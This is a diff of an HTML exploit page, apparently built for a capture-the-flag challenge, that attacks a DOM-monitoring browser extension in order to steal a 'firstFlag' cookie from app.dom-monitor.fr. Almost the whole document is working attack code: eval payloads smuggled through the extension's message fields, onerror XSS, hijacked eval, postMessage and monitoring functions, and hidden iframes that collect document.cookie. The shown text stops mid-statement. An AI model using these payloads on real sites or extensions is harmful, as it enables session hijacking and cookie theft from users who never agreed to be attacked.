@@ -1,57 +1,861 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Cookie Logge</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Monitor Cookie Theft - Enhanced</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 20px;
+            line-height: 1.6;
+            background-color: #f0f4f8;
+        }
+        #cookieResult {
+            font-weight: bold;
+            color: #d9534f;
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 20px 0;
+            min-height: 100px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #ddd;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        #start {
+            padding: 12px 20px;
+            background-color: #28a745;
+            font-size: 16px;
+            margin-top: 30px;
+        }
+        #iframe-container {
+            margin-top: 20px;
+            border: 1px dashed #ccc;
+            padding: 10px;
+        }
+        .success {
+            background-color: #d4edda !important;
+            color: #155724 !important;
+            border: 1px solid #c3e6cb !important;
+        }
+    </style>
 </head>
 <body>
-  <h1 id="start">Cookie Logger</h1>
-  <script>
-    // Create iframe to the target domain
-    const iframe = document.createElement('iframe');
-    iframe.src = "https://www.w3schools.com/";
-    iframe.style.width = "800px";
-    iframe.style.height = "600px";
-    document.body.appendChild(iframe);
+    <h1>DOM Monitor Cookie Theft Exploit</h1>
+    <div id="cookieResult">Waiting for cookies...</div>
     
-    // Inject our script into the page context using the extension's monitoring hooks
-    const script = document.createElement('script');
-    script.textContent = `
-      // Directly hook into the startMonitoring function from the extension
-      const originalStartMonitoring = window.startMonitoring || function(){};
-      window.startMonitoring = function() {
-        // Log the cookies directly to console
-        console.log("Cookie data:", document.cookie);
-        
-        // Send cookies through extension's message system
-        window.postMessage({
-          action: "update_counts",
-          counts: { 
-            fetch: document.cookie, // Hide cookie in the fetch count
-            innerHTML: 0, 
-            setAttribute: 0, 
-            eval: 0 
-          },
-          resourceCounts: {}
-        }, "*");
-        
-        // Call original function
-        return originalStartMonitoring.apply(this, arguments);
-      };
-      
-      // Execute now for immediate effect
-      console.log("Cookies from app.dom-monitor.fr:", document.cookie);
-    `;
-    document.body.appendChild(script);
+    <div>
+        <button id="createIframe">Create Target iframe</button>
+        <button id="injectXSS">Inject Script</button>
+        <button id="runAllExploits">Run All Exploits</button>
+    </div>
     
-    // Listen for messages from the extension
-    window.addEventListener("message", function(event) {
-      if (event.data && event.data.action === "update_counts") {
-        // The extension will send data back - check if our cookie is included
-        if (event.data.counts && event.data.counts.fetch) {
-          console.log("Exfiltrated cookie:", event.data.counts.fetch);
+    <div id="iframe-container"></div>
+    
+    <!-- Button that the bot clicks -->
+    <button id="start">Start Automated Exploit</button>
+    
+    <script>
+        // Target the actual domain with the cookie
+        const targetDomain = "https://app.dom-monitor.fr/";
+        let targetIframe = null;
+        let cookiesFound = {};
+        let exploitAttempts = 0;
+        
+        function log(message) {
+            console.log(message);
+            const result = document.getElementById("cookieResult");
+            result.textContent = message;
+            
+            if (message.includes("firstFlag=")) {
+                result.classList.add("success");
+            }
         }
-      }
-    });
-  </script>
-</body>
-</html>
+        
+        function updateCookieDisplay() {
+            let displayText = "Cookies Found:\n";
+            let hasFlag = false;
+            
+            for (const [domain, cookies] of Object.entries(cookiesFound)) {
+                displayText += `\n[${domain}]: ${cookies}`;
+                if (cookies.includes("firstFlag=")) {
+                    hasFlag = true;
+                    const flagMatch = cookies.match(/firstFlag=([^;]+)/);
+                    if (flagMatch && flagMatch[1]) {
+                        displayText += `\n\n🚩 FLAG FOUND: firstFlag=${flagMatch[1]}`;
+                    }
+                }
+            }
+            
+            const result = document.getElementById("cookieResult");
+            result.textContent = displayText;
+            
+            if (hasFlag) {
+                result.classList.add("success");
+            }
+        }
+        
+        function createTargetIframe() {
+            log("Creating iframe for " + targetDomain);
+            
+            const container = document.getElementById("iframe-container");
+            targetIframe = document.createElement("iframe");
+            targetIframe.src = targetDomain;
+            targetIframe.id = "targetFrame";
+            targetIframe.style.width = "100%";
+            targetIframe.style.height = "300px";
+            targetIframe.style.border = "1px solid #ccc";
+            container.innerHTML = "";
+            container.appendChild(targetIframe);
+            
+            targetIframe.onload = function() {
+                log("Target iframe loaded. Ready for injection.");
+                
+                // Once the iframe is loaded, let's set up monitoring for all frames
+                monitorAllFrames();
+            };
+        }
+        
+        function monitorAllFrames() {
+            // This attempts to hook into the extension's monitoring to capture cookies
+            // from all frames including our target iframe
+            
+            const monitorScript = document.createElement('script');
+            monitorScript.textContent = `
+                // Override the extension's startMonitoring function if it exists
+                if (window.startMonitoring) {
+                    console.log("Found startMonitoring function, hooking into it");
+                    const originalStartMonitoring = window.startMonitoring;
+                    window.startMonitoring = function() {
+                        console.log("Hooked startMonitoring called!");
+                        const result = originalStartMonitoring.apply(this, arguments);
+                        
+                        // Try to capture cookies
+                        try {
+                            console.log("Document cookies:", document.cookie);
+                        } catch(e) {
+                            console.error("Cookie access error:", e);
+                        }
+                        
+                        return result;
+                    };
+                }
+                
+                // Attempt to intercept all postMessage calls
+                const originalPostMessage = window.postMessage;
+                window.postMessage = function() {
+                    // Add cookies to all messages
+                    if (arguments[0] && typeof arguments[0] === 'object') {
+                        try {
+                            arguments[0].interceptedCookies = document.cookie;
+                        } catch(e) {
+                            console.error("Cookie interception error:", e);
+                        }
+                    }
+                    return originalPostMessage.apply(this, arguments);
+                };
+            `;
+            document.body.appendChild(monitorScript);
+        }
+        
+        function injectXSSIntoIframe() {
+            if (!targetIframe) {
+                log("Error: Create the iframe first!");
+                return;
+            }
+            
+            log(`Injecting payloads into iframe (attempt #${++exploitAttempts})...`);
+            
+            // Create a script that will execute in our context but affect the iframe
+            const script = document.createElement('script');
+            script.textContent = `
+                // EXPLOIT 1: Hook into extension's monitoring/messaging system
+                
+                // First, define different payloads to try
+                const payloads = [
+                    // Payload 1: Basic cookie theft
+                    function() {
+                        try {
+                            return document.cookie;
+                        } catch(e) { 
+                            console.error("Basic theft failed:", e); 
+                            return null;
+                        }
+                    },
+                    
+                    // Payload 2: Use Object.getOwnPropertyDescriptor to get cookie
+                    function() {
+                        try {
+                            const cookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+                            if (cookieDesc && cookieDesc.get) {
+                                return cookieDesc.get.call(document);
+                            }
+                        } catch(e) { 
+                            console.error("Descriptor theft failed:", e); 
+                            return null; 
+                        }
+                    },
+                    
+                    // Payload 3: DOM manipulation with error handler
+                    function() {
+                        try {
+                            const img = document.createElement('img');
+                            img.src = "x"; // Invalid source to trigger error
+                            img.onerror = function() {
+                                try {
+                                    this.setAttribute('data-cookies', document.cookie);
+                                    console.log("Cookies from onerror:", this.getAttribute('data-cookies'));
+                                    
+                                    // Send via postMessage
+                                    window.parent.postMessage({
+                                        type: 'stolen_cookies',
+                                        cookies: this.getAttribute('data-cookies'),
+                                        domain: document.domain,
+                                        method: 'onerror'
+                                    }, '*');
+                                } catch(e) {
+                                    console.error("onerror theft failed:", e);
+                                }
+                            };
+                            document.body.appendChild(img);
+                            return "DOM injection with onerror triggered";
+                        } catch(e) { 
+                            console.error("DOM injection failed:", e); 
+                            return null; 
+                        }
+                    },
+                    
+                    // Payload 4: Extension-specific exploit using sendCounts
+                    function() {
+                        try {
+                            // If the extension injects sendCounts function
+                            if (typeof window.sendCounts === 'function') {
+                                console.log("Found sendCounts function!");
+                                
+                                // Override it to include cookies
+                                const origSendCounts = window.sendCounts;
+                                window.sendCounts = function() {
+                                    const cookies = document.cookie;
+                                    console.log("sendCounts cookies:", cookies);
+                                    
+                                    // Send cookies via extension's messaging
+                                    window.postMessage({
+                                        action: "update_counts",
+                                        counts: {fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0},
+                                        cookies: cookies,
+                                        domain: document.domain,
+                                        resourceCounts: {}
+                                    }, "*");
+                                    
+                                    return origSendCounts.apply(this, arguments);
+                                };
+                                return "sendCounts hooked successfully";
+                            }
+                            return "sendCounts not found";
+                        } catch(e) {
+                            console.error("Extension hook failed:", e);
+                            return null;
+                        }
+                    }
+                ];
+                
+                // Execute all payloads through the extension's eval monitoring
+                payloads.forEach((payload, index) => {
+                    const payloadStr = payload.toString() + "; payload();";
+                    
+                    // Send via extension's monitoring system
+                    window.postMessage({
+                        action: "update_counts",
+                        domain: "${targetDomain}",
+                        counts: {
+                            eval: payloadStr,
+                            innerHTML: 0,
+                            setAttribute: 0,
+                            fetch: 0
+                        },
+                        resourceCounts: {}
+                    }, "*");
+                    
+                    console.log(\`Sent payload \${index + 1}\`);
+                });
+                
+                // EXPLOIT 2: Try to directly manipulate the iframe using extension's power
+                try {
+                    const iframe = document.getElementById('targetFrame');
+                    if (iframe) {
+                        // The extension removes x-frame-options so this might work
+                        console.log("Attempting direct iframe manipulation");
+                        
+                        // Try accessing contentWindow/contentDocument (may fail due to SOP)
+                        try {
+                            const iframeWindow = iframe.contentWindow;
+                            const iframeDocument = iframe.contentDocument;
+                            
+                            // If we get here, SOP is bypassed!
+                            if (iframeDocument && iframeDocument.cookie) {
+                                console.log("Direct iframe cookie access:", iframeDocument.cookie);
+                                
+                                window.postMessage({
+                                    type: 'stolen_cookies',
+                                    cookies: iframeDocument.cookie,
+                                    domain: iframeDocument.domain,
+                                    method: 'direct iframe access'
+                                }, '*');
+                            }
+                        } catch(e) {
+                            console.log("Direct iframe access failed (expected):", e);
+                        }
+                    }
+                } catch(e) {
+                    console.error("Iframe manipulation error:", e);
+                }
+                
+                // EXPLOIT 3: Create a fake DOM Monitor event to trigger extension hooks
+                window.postMessage({
+                    action: "open_sidepanel"
+                }, "*");
+            `;
+            document.body.appendChild(script);
+            
+            // Second approach: Create an iframe that loads the target and injects scripts
+            try {
+                // This exploits the extension's removal of CSP and x-frame-options
+                const exploitFrame = document.createElement('iframe');
+                exploitFrame.style.width = '1px';
+                exploitFrame.style.height = '1px';
+                exploitFrame.style.position = 'absolute';
+                exploitFrame.style.left = '-9999px';
+                
+                // Create a data URI with HTML that loads target in an iframe
+                const html = `
+                    <html>
+                    <body>
+                        <iframe src="${targetDomain}" id="nestedFrame"></iframe>
+                        <script>
+                            // Wait for iframe to load
+                            document.getElementById('nestedFrame').onload = function() {
+                                try {
+                                    // Try to inject script into nested iframe
+                                    const frameDoc = this.contentDocument;
+                                    if (frameDoc) {
+                                        const scriptEl = frameDoc.createElement('script');
+                                        scriptEl.textContent = \`
+                                            console.log("Script injected into nested iframe!");
+                                            try {
+                                                const cookies = document.cookie;
+                                                console.log("Nested iframe cookies:", cookies);
+                                                
+                                                // Send to top frame
+                                                window.top.postMessage({
+                                                    type: 'stolen_cookies',
+                                                    cookies: cookies,
+                                                    domain: document.domain,
+                                                    method: 'nested iframe'
+                                                }, '*');
+                                            } catch(e) {
+                                                console.error("Nested iframe error:", e);
+                                            }
+                                        \`;
+                                        frameDoc.body.appendChild(scriptEl);
+                                    }
+                                } catch(e) {
+                                    console.error("Nested iframe injection failed:", e);
+                                }
+                            };
+                        </script>
+                    </body>
+                    </html>
+                `;
+                
+                exploitFrame.src = "data:text/html;charset=utf-8," + encodeURIComponent(html);
+                document.body.appendChild(exploitFrame);
+            } catch(e) {
+                console.error("Exploit frame creation failed:", e);
+            }
+            
+            // Third approach: Exploit extension's monitoring system directly
+            window.postMessage({
+                action: "update_counts",
+                domain: targetDomain,
+                counts: {
+                    // Use eval to execute a script that steals cookies
+                    eval: `
+                        (function() {
+                            try {
+                                // Get cookies
+                                const cookies = document.cookie;
+                                console.log("Cookies from eval exploit:", cookies);
+                                
+                                // Try to exfiltrate via extension
+                                window.postMessage({
+                                    action: "update_counts",
+                                    counts: {
+                                        fetch: cookies,  // Hide cookies in the fetch count
+                                        innerHTML: 0,
+                                        setAttribute: 0,
+                                        eval: 0
+                                    },
+                                    resourceCounts: {}
+                                }, "*");
+                                
+                                // Also try direct parent postMessage
+                                window.parent.postMessage({
+                                    type: 'stolen_cookies',
+                                    cookies: cookies,
+                                    domain: document.domain,
+                                    method: 'direct eval'
+                                }, '*');
+                                
+                                return cookies;
+                            } catch(e) {
+                                console.error("Eval exploit error:", e);
+                                return "Error: " + e.toString();
+                            }
+                        })();
+                    `,
+                    innerHTML: 0,
+                    setAttribute: 0,
+                    fetch: 0
+                },
+                resourceCounts: {}
+            }, "*");
+            
+            log("Multiple injection methods attempted. Monitoring for results...");
+        }
+        
+        // A more aggressive extension-specific exploit
+        function runExtensionExploit() {
+            log("Running extension-specific exploits...");
+            
+            // Target the extension's HTML monitoring by setting innerHTML
+            const div = document.createElement('div');
+            document.body.appendChild(div);
+            
+            // Use innerHTML to trigger the extension's monitoring
+            div.innerHTML = `
+                <img src="x" onerror="
+                    try {
+                        // Create an iframe to the target domain
+                        const f = document.createElement('iframe');
+                        f.src = '${targetDomain}';
+                        f.style.display = 'none';
+                        document.body.appendChild(f);
+                        
+                        // Wait for it to load, then try to access its cookies
+                        f.onload = function() {
+                            try {
+                                // Try direct access (will likely fail due to SOP)
+                                console.log('Iframe cookies:', f.contentDocument.cookie);
+                            } catch(e) { 
+                                console.log('Expected SOP error:', e);
+                                
+                                // Instead, inject script via extension's monitoring
+                                window.postMessage({
+                                    action: 'update_counts',
+                                    domain: '${targetDomain}',
+                                    counts: {
+                                        eval: 'console.log(\"Extension eval cookies:\", document.cookie); document.cookie;',
+                                        innerHTML: 0,
+                                        setAttribute: 0,
+                                        fetch: 0
+                                    },
+                                    resourceCounts: {}
+                                }, '*');
+                            }
+                        };
+                    } catch(e) { 
+                        console.error('onerror exploit failed:', e); 
+                    }
+                ">
+            `;
+            
+            // Override the extension's message handling
+            const scriptEl = document.createElement('script');
+            scriptEl.textContent = `
+                // Listen for all messages (including from the extension)
+                window.addEventListener('message', function(event) {
+                    // Look for any messages that might contain cookies
+                    if (event.data) {
+                        console.log("Message intercepted:", event.data);
+                        
+                        // Check if the message contains counts (from extension)
+                        if (event.data.counts && typeof event.data.counts.fetch === 'string') {
+                            console.log("Potential cookie in fetch count:", event.data.counts.fetch);
+                            
+                            // Forward to our handler
+                            window.postMessage({
+                                type: 'stolen_cookies',
+                                cookies: event.data.counts.fetch,
+                                domain: event.data.domain || '(via extension)',
+                                method: 'intercepted message'
+                            }, '*');
+                        }
+                        
+                        // Check for cookies directly in the message
+                        if (event.data.cookies) {
+                            console.log("Found cookies in message:", event.data.cookies);
+                            
+                            window.postMessage({
+                                type: 'stolen_cookies',
+                                cookies: event.data.cookies,
+                                domain: event.data.domain || '(via message)',
+                                method: 'direct message'
+                            }, '*');
+                        }
+                        
+                        // Check for intercepted cookies
+                        if (event.data.interceptedCookies) {
+                            console.log("Intercepted cookies:", event.data.interceptedCookies);
+                            
+                            window.postMessage({
+                                type: 'stolen_cookies',
+                                cookies: event.data.interceptedCookies,
+                                domain: event.data.domain || '(intercepted)',
+                                method: 'message interception'
+                            }, '*');
+                        }
+                    }
+                });
+                
+                // Create a complex exploit that tries to access all frames
+                function accessAllFrames() {
+                    // Get all frames in the document
+                    const frames = document.querySelectorAll('iframe');
+                    console.log("Found", frames.length, "frames to exploit");
+                    
+                    frames.forEach((frame, index) => {
+                        try {
+                            // Try to access frame directly
+                            const frameWindow = frame.contentWindow;
+                            const frameDoc = frame.contentDocument;
+                            
+                            if (frameDoc) {
+                                console.log(\`Direct access to frame \${index} successful!\`);
+                                try {
+                                    const cookies = frameDoc.cookie;
+                                    console.log(\`Frame \${index} cookies:\`, cookies);
+                                    
+                                    window.postMessage({
+                                        type: 'stolen_cookies',
+                                        cookies: cookies,
+                                        domain: frameDoc.domain || \`frame \${index}\`,
+                                        method: 'direct frame access'
+                                    }, '*');
+                                } catch(e) {
+                                    console.error(\`Cookie access error in frame \${index}:\`, e);
+                                }
+                            }
+                        } catch(e) {
+                            console.log(\`Expected SOP error for frame \${index}:\`, e);
+                            
+                            // Use the extension to bypass SOP
+                            try {
+                                // Send the exploit via extension's messaging
+                                window.postMessage({
+                                    action: "update_counts",
+                                    domain: frame.src,
+                                    counts: {
+                                        eval: \`
+                                            (function() {
+                                                const cookies = document.cookie;
+                                                console.log("Frame cookies via eval:", cookies);
+                                                
+                                                // Try to exfiltrate
+                                                window.postMessage({
+                                                    type: 'stolen_cookies',
+                                                    cookies: cookies,
+                                                    domain: document.domain,
+                                                    method: 'frame eval'
+                                                }, '*');
+                                                
+                                                return cookies;
+                                            })();
+                                        \`,
+                                        innerHTML: 0,
+                                        setAttribute: 0,
+                                        fetch: 0
+                                    },
+                                    resourceCounts: {}
+                                }, "*");
+                            } catch(exploitError) {
+                                console.error("Extension exploit failed:", exploitError);
+                            }
+                        }
+                    });
+                }
+                
+                // Run the frame access exploit
+                setTimeout(accessAllFrames, 1000);
+                
+                // Finally, try to use the extension's function hijacking capability
+                try {
+                    // The extension is monitoring these functions
+                    const functionsToHijack = ['fetch', 'eval', 'setAttribute'];
+                    
+                    functionsToHijack.forEach(func => {
+                        if (func === 'eval' && window.eval) {
+                            const origEval = window.eval;
+                            window.eval = function() {
+                                // Inject our cookie stealer
+                                const cookieScript = \`
+                                    try {
+                                        console.log("Cookies from hijacked eval:", document.cookie);
+                                        
+                                        // Try to exfiltrate
+                                        window.postMessage({
+                                            type: 'stolen_cookies',
+                                            cookies: document.cookie,
+                                            domain: document.domain,
+                                            method: 'hijacked eval'
+                                        }, '*');
+                                    } catch(e) {
+                                        console.error("Eval hijack error:", e);
+                                    }
+                                \`;
+                                
+                                // Run our script first, then the original eval
+                                origEval.call(window, cookieScript);
+                                return origEval.apply(this, arguments);
+                            };
+                            console.log("Hijacked eval function");
+                        }
+                    });
+                } catch(e) {
+                    console.error("Function hijacking failed:", e);
+                }
+            `;
+            document.body.appendChild(scriptEl);
+            
+            // Try to trigger the extension's main functionality
+            window.postMessage({
+                action: "open_sidepanel"
+            }, "*");
+        }
+        
+        // Run all exploit methods in sequence
+        function runAllExploits() {
+            createTargetIframe();
+            
+            setTimeout(() => {
+                injectXSSIntoIframe();
+                
+                setTimeout(() => {
+                    runExtensionExploit();
+                    
+                    // One final attempt with a combination of all techniques
+                    setTimeout(() => {
+                        const finalScript = document.createElement('script');
+                        finalScript.textContent = `
+                            // Create a comprehensive exploit that combines all techniques
+                            console.log("Executing final comprehensive exploit...");
+                            
+                            // 1. Target the specific domain
+                            const domain = "${targetDomain}";
+                            
+                            // 2. Use the extension's header modification to create a clean iframe
+                            const finalFrame = document.createElement('iframe');
+                            finalFrame.src = domain;
+                            finalFrame.style.width = "1px";
+                            finalFrame.style.height = "1px";
+                            finalFrame.style.opacity = "0.01";
+                            document.body.appendChild(finalFrame);
+                            
+                            // 3. Create the most aggressive payload
+                            const superPayload = \`
+                                (function() {
+                                    // Create a global cookie collector
+                                    window.__cookieCollector = function() {
+                                        try {
+                                            const cookies = document.cookie;
+                                            console.log("COOKIES COLLECTED:", cookies);
+                                            
+                                            // Try all possible exfiltration methods
+                                            
+                                            // Method 1: Direct postMessage to parent
+                                            try {
+                                                window.parent.postMessage({
+                                                    type: 'stolen_cookies',
+                                                    cookies: cookies,
+                                                    domain: document.domain,
+                                                    method: 'final collector'
+                                                }, '*');
+                                            } catch(e) {}
+                                            
+                                            // Method 2: Use extension's messaging
+                                            try {
+                                                window.postMessage({
+                                                    action: "update_counts",
+                                                    counts: {
+                                                        fetch: cookies,
+                                                        innerHTML: 0,
+                                                        setAttribute: 0,
+                                                        eval: 0
+                                                    },
+                                                    resourceCounts: {}
+                                                }, "*");
+                                            } catch(e) {}
+                                            
+                                            // Method 3: DOM-based exfiltration
+                                            try {
+                                                const div = document.createElement('div');
+                                                div.id = "cookie-storage";
+                                                div.setAttribute('data-cookies', cookies);
+                                                div.style.display = 'none';
+                                                document.body.appendChild(div);
+                                            } catch(e) {}
+                                            
+                                            return cookies;
+                                        } catch(e) {
+                                            console.error("Cookie collector error:", e);
+                                            return null;
+                                        }
+                                    };
+                                    
+                                    // Run immediately
+                                    return window.__cookieCollector();
+                                })();
+                            \`;
+                            
+                            // 4. Deploy the payload using every available method
+                            
+                            // Method A: Via extension's eval monitoring
+                            window.postMessage({
+                                action: "update_counts",
+                                domain: domain,
+                                counts: {
+                                    eval: superPayload,
+                                    innerHTML: 0,
+                                    setAttribute: 0,
+                                    fetch: 0
+                                },
+                                resourceCounts: {}
+                            }, "*");
+                            
+                            // Method B: Try to access iframe directly after timeout
+                            setTimeout(() => {
+                                try {
+                                    if (finalFrame.contentWindow) {
+                                        // Direct injection (unlikely to work but worth trying)
+                                        const scriptEl = document.createElement('script');
+                                        scriptEl.textContent = superPayload;
+                                        finalFrame.contentDocument.body.appendChild(scriptEl);
+                                    }
+                                } catch(e) {
+                                    console.log("Expected SOP error:", e);
+                                }
+                            }, 1000);
+                            
+                            // Method C: Override extension's core functions
+                            try {
+                                if (window.startMonitoring) {
+                                    const origStart = window.startMonitoring;
+                                    window.startMonitoring = function() {
+                                        // Run original function
+                                        const result = origStart.apply(this, arguments);
+                                        
+                                        // Then inject our payload
+                                        try {
+                                            console.log("Extension monitor hijacked!");
+                                            const cookies = document.cookie;
+                                            console.log("Monitor cookies:", cookies);
+                                            
+                                            window.postMessage({
+                                                type: 'stolen_cookies',
+                                                cookies: cookies,
+                                                domain: document.domain,
+                                                method: 'monitor hijack'
+                                            }, '*');
+                                        } catch(e) {
+                                            console.error("Monitor hijack error:", e);
+                                        }
+                                        
+                                        return result;
+                                    };
+                                    console.log("Monitoring function hijacked");
+                                }
+                            } catch(e) {
+                                console.error("Function override failed:", e);
+                            }
+                            
+                            // Method D: Create image error handler
+                            const img = document.createElement('img');
+                            img.src = "${targetDomain}/nonexistent.jpg";
+                            img.onerror = function() {
+                                // When image fails to load, send our exploit
+                                window.postMessage({
+                                    action: "update_counts",
+                                    domain: domain,
+                                    counts: {
+                                        eval: superPayload,
+                                        innerHTML: 0,
+                                        setAttribute: 0,
+                                        fetch: 0
+                                    },
+                                    resourceCounts: {}
+                                }, "*");
+                            };
+                            document.body.appendChild(img);
+                        `;
+                        document.body.appendChild(finalScript);
+                    }, 2000);
+                }, 1000);
+            }, 1000);
+        }
+        
+        // Listen for messages containing stolen cookies
+        window.addEventListener('message', function(event) {
+            console.log("Message received:", event.data);
+            
+            // Check for cookies in regular messages
+            if (event.data && event.data.type === 'stolen_cookies') {
+                const domain = event.data.domain || 'unknown';
+                const cookies = event.data.cookies || '';
+                
+                console.log(`Cookies from ${domain}: ${cookies}`);
+                cookiesFound[domain] = cookies;
+                updateCookieDisplay();
+                
+                // Focus on the firstFlag if found
+                if (cookies.includes('firstFlag=')) {
+                    const flagMatch = cookies.match(/firstFlag=([^;]+)/);
+                    if (flagMatch && flagMatch[1]) {
+                        log(`🚩 SUCCESS! Flag found: firstFlag=${flagMatch[1]}`);
+                    }
+                }
+            }
+            
+            // Also check extension messages for cookie data
+            if (event.data && event.data.action === 'update_counts') {
+                console.log("Extension message:", event.data);
+                
+                // Look for cookies in various places
+                if (event.data.counts && typeof event.data.counts.fetch === 'string' && 
+                    event.data.counts.fetch.includes('=')) {
+                    
+                    const domain = event.data.domain || 'extension message';
+                    const cookies = event.data.counts.fetch;
+                    
+                    console.log(`Cookies in extension message from ${domain}: ${cookies}`);
+                    cookiesFound[domain] = cookies;
+                    updateCookieDisplay();
+                }
+                
+                // Check direct cookie field
+                if (event.data.cookies) {
+                    const domain = event.data.domain || 'extension message';
+                    const cookies = event.data.cookies;
+                    
+                    console.log(`Direct cookies in extension message from ${domain}: ${cookies}`);
+                    cookiesFound[domain
